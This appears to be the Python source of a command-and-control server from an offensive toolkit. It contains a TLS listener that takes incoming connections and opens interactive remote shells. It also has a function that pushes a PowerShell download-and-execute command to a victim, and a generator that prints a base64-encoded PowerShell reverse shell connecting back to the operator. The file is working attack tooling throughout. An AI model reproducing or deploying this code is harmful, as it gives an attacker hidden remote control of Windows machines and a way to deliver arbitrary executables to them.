#!/usr/bin/python
import socket
import ssl
import random
import re
import sys
import os
import time
from threading import Thread
from main import *
from menu import *


def startListener():
    try:
        time.sleep(0.25)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ws = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1, certfile="server.crt", keyfile="server.key", server_side=True)
        ws.bind((FUNCTIONS().CheckInternet(), 5555))
        ws.listen(5)
        print t.bold_red + "listening on port 5555" + t.normal

        startWorker = True
        clientnumber = 0

        while True:
            clientconn, address = ws.accept()
            ip , port = address
            if clientconn:
                clientnumber += 1
                print t.bold_green + "connection from %s %s"%(ip,port) + t.normal
                if startWorker:
                        worker = Thread(target=pingClients, args=(clientconn,clientnumber))
                        worker.setDaemon(True)
                        worker.start()
                        startWorker = False

            from menu import clientMenuOptions
            clientMenuOptions[str(clientnumber)] =  {'payloadchoice': None, 'payload':ip + ":" + str(port), 'extrawork': interactShell, 'params': (clientconn,clientnumber)}
        ws.close()
    except IOError:
        print t.bold_red + "[*] Rerun ./setup.py to generate certs" + t.normal
    except Exception as E:
        print t.bold_red + "[*] Error With Listener" + t.normal
        print E

def interactShell(clientconn,clientnumber):
    from menu import clientMenuOptions
    print "Commands\n" + "-"*24 + "\nback - Background Shell\nkill - Close Connection\n" + "-"*24
    while True:
        data = ''
        command = raw_input("PS >")
        if command == "back":
            break
        if command == "kill":
            print t.bold_red + "Client Connection Killed" + t.normal
            del clientMenuOptions[str(clientnumber)]
            clientconn.close()
            break
        if command == "":
            continue
        clientconn.sendall(command)
        a = True
        while a:
            data += clientconn.recv(16834).encode("utf-8")
            if data[-1] == "\x00":
                a = False
        print data
    return True


def clientUpload(fileToUpload,clientconn):
    print t.bold_green + "[*] Starting Transfer" + t.normal
    ipaddr = FUNCTIONS().CheckInternet()
    FUNCTIONS().DoServe(ipaddr,fileToUpload,os.path.dirname(fileToUpload))
    clientconn.sendall("$a = New-Object System.Net.WebClient;$a.DownloadFile(\"http://" + ipaddr + ':8000/' + fileToUpload.split('/')[-1] + "\",\"$Env:TEMP\\temp.exe\");Start-Sleep -s 15;Start-Process \"$Env:TEMP\\temp.exe\"")

def printListener():
    windows_ps_rev_shell = (
        "$client = New-Object System.Net.Sockets.TCPClient('" + FUNCTIONS().CheckInternet() + "','" + str(5555) + "');"
        "$stream = $client.GetStream();"
        "[byte[]]$bytes = 0..65535|%{0};"
        "$sslstream = New-Object System.Net.Security.SslStream $stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
        "$sslstream.AuthenticateAsClient('10.131.101.65');"
        "while(($i = $sslstream.Read($bytes, 0, $bytes.Length)) -ne 0)"
        "{$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding; $data = $EncodedText.GetString($bytes,0, $i);"
        "$commandback = (Invoke-Expression -Command $data 2>&1 | Out-String );"
        "$backres = $commandback + ($error[0] | Out-String) + \"\x00\";$error.clear();"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($backres);$sslstream.Write($sendbyte,0,$sendbyte.Length);"
        "$sslstream.Flush()};$client.Close();if ($listener){$listener.Stop()}")
    print 'powershell.exe -enc ' + windows_ps_rev_shell.encode('utf_16_le').encode('base64').replace('\n','')
    return True

def pingClients(clientconn,clientnumber):
    from menu import clientMenuOptions
    try:
        while True:
            time.sleep(30)
            clientconn.sendall("pwd")
            pingdata = clientconn.recv(200).encode("utf-8").replace('\n','')
    except:
        print t.bold_red + "Client %s Has Disconnected" % clientnumber + t.normal
        del clientMenuOptions[str(clientnumber)]
